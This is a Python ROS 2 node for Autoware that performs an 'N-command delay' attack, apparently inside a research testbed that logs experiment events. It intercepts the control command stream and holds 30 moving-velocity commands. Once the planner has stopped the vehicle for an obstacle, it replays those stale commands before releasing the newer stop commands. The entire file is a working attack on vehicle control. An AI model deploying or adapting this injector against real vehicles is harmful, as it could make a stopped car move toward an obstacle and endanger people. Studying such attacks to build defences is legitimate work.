import copy
import json
import math

import rclpy
from autoware_control_msgs.msg import Control
from autoware_planning_msgs.msg import Trajectory
from autoware_vehicle_msgs.msg import VelocityReport
from rclpy.node import Node
from std_msgs.msg import String

from .trajectory_probe import first_stop_x


def stamp_to_ns(stamp):
    return int(stamp.sec) * 1_000_000_000 + int(stamp.nanosec)


class NCommandDelay(Node):
    """Delay N real Control messages and replay them after a physical stop."""

    def __init__(self):
        super().__init__("n_command_delay")
        self.declare_parameter("input_topic", "/control/trajectory_follower/control_cmd")
        self.declare_parameter("output_topic", "/attack/control_cmd")
        self.declare_parameter("attack_point", "before_gate")
        self.declare_parameter("hold_count", 30)
        self.declare_parameter("capture_min_velocity", 0.05)
        self.declare_parameter("stop_speed", 0.02)
        self.declare_parameter("stop_settle_time", 0.5)
        self.declare_parameter("replay_period", 0.03)

        input_topic = str(self.get_parameter("input_topic").value)
        output_topic = str(self.get_parameter("output_topic").value)
        self.attack_point = str(self.get_parameter("attack_point").value)
        self.hold_count = int(self.get_parameter("hold_count").value)
        self.capture_min_velocity = float(
            self.get_parameter("capture_min_velocity").value
        )
        self.stop_speed = float(self.get_parameter("stop_speed").value)
        self.stop_settle_ns = int(
            float(self.get_parameter("stop_settle_time").value) * 1_000_000_000
        )
        self.replay_period = float(self.get_parameter("replay_period").value)

        self.output = self.create_publisher(Control, output_topic, 100)
        self.events = self.create_publisher(String, "/experiment/attack_events", 100)
        self.create_subscription(Control, input_topic, self.on_control, 100)
        self.create_subscription(
            Trajectory, "/planning/trajectory_raw", self.on_raw_trajectory, 10
        )
        self.create_subscription(
            Trajectory, "/planning/trajectory", self.on_planned_trajectory, 10
        )
        self.create_subscription(
            VelocityReport, "/vehicle/status/velocity_status", self.on_velocity, 10
        )

        self.held = []
        self.live_queue = []
        self.state = "CAPTURE"
        self.replay_index = 0
        self.raw_stop_x = math.nan
        self.obstacle_stop_seen = False
        self.moving_seen = False
        self.speed_mps = 0.0
        self.stopped_since_ns = None
        self.create_timer(self.replay_period, self.tick)
        self.get_logger().info(
            f"N-command delay armed at {self.attack_point}: input={input_topic}, "
            f"output={output_topic}, N={self.hold_count}, period={self.replay_period:.3f}s"
        )

    def now_ns(self):
        return self.get_clock().now().nanoseconds

    def publish_event(self, kind, **values):
        event = {
            "kind": kind,
            "attack_point": self.attack_point,
            "t_ns": self.now_ns(),
            **values,
        }
        self.events.publish(String(data=json.dumps(event, sort_keys=True)))

    def on_raw_trajectory(self, msg):
        self.raw_stop_x = first_stop_x(msg)

    def on_planned_trajectory(self, msg):
        planned_stop_x = first_stop_x(msg)
        if (
            math.isfinite(self.raw_stop_x)
            and math.isfinite(planned_stop_x)
            and self.raw_stop_x - planned_stop_x > 0.02
        ):
            self.obstacle_stop_seen = True

    def on_velocity(self, msg):
        self.speed_mps = abs(float(msg.longitudinal_velocity))
        if self.speed_mps > 0.05:
            self.moving_seen = True
        now_ns = self.now_ns()
        if self.moving_seen and self.speed_mps <= self.stop_speed:
            if self.stopped_since_ns is None:
                self.stopped_since_ns = now_ns
        else:
            self.stopped_since_ns = None

    def on_control(self, msg):
        velocity = float(msg.longitudinal.velocity)
        if self.state == "CAPTURE" and velocity > self.capture_min_velocity:
            self.held.append(copy.deepcopy(msg))
            self.publish_event(
                "capture",
                index=len(self.held) - 1,
                velocity=velocity,
                original_stamp_ns=stamp_to_ns(msg.stamp),
            )
            if len(self.held) >= self.hold_count:
                self.state = "PASS"
                self.publish_event("capture_complete", count=len(self.held))
                self.get_logger().info(f"[ATTACK] captured {len(self.held)} commands")
            return

        if self.state == "REPLAY":
            self.live_queue.append(copy.deepcopy(msg))
            return

        self.output.publish(msg)

    def ready_to_replay(self):
        return (
            self.state == "PASS"
            and len(self.held) == self.hold_count
            and self.obstacle_stop_seen
            and self.moving_seen
            and self.stopped_since_ns is not None
            and self.now_ns() - self.stopped_since_ns >= self.stop_settle_ns
        )

    def tick(self):
        if self.ready_to_replay():
            self.state = "REPLAY"
            self.replay_index = 0
            self.publish_event(
                "release_start",
                count=len(self.held),
                stopped_speed_mps=self.speed_mps,
            )
            self.get_logger().warning(
                f"[ATTACK] vehicle stopped; replaying {len(self.held)} stale commands"
            )

        if self.state != "REPLAY":
            return

        if self.replay_index < len(self.held):
            msg = self.held[self.replay_index]
            now_ns = self.now_ns()
            self.output.publish(msg)
            self.publish_event(
                "release_command",
                index=self.replay_index,
                velocity=float(msg.longitudinal.velocity),
                original_stamp_ns=stamp_to_ns(msg.stamp),
                age_ms=(now_ns - stamp_to_ns(msg.stamp)) / 1_000_000.0,
            )
            self.replay_index += 1
            return

        # The link is serial: newer commands accumulated behind the delayed
        # batch.  Flush them in their original order so the newest STOP is last.
        queued_count = len(self.live_queue)
        for msg in self.live_queue:
            self.output.publish(msg)
        self.live_queue.clear()
        self.state = "DONE"
        self.publish_event("release_end", queued_live_commands=queued_count)
        self.get_logger().warning(
            f"[ATTACK] stale replay complete; flushed {queued_count} newer commands"
        )


def main(args=None):
    rclpy.init(args=args)
    node = NCommandDelay()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        if rclpy.ok():
            rclpy.shutdown()


if __name__ == "__main__":
    main()
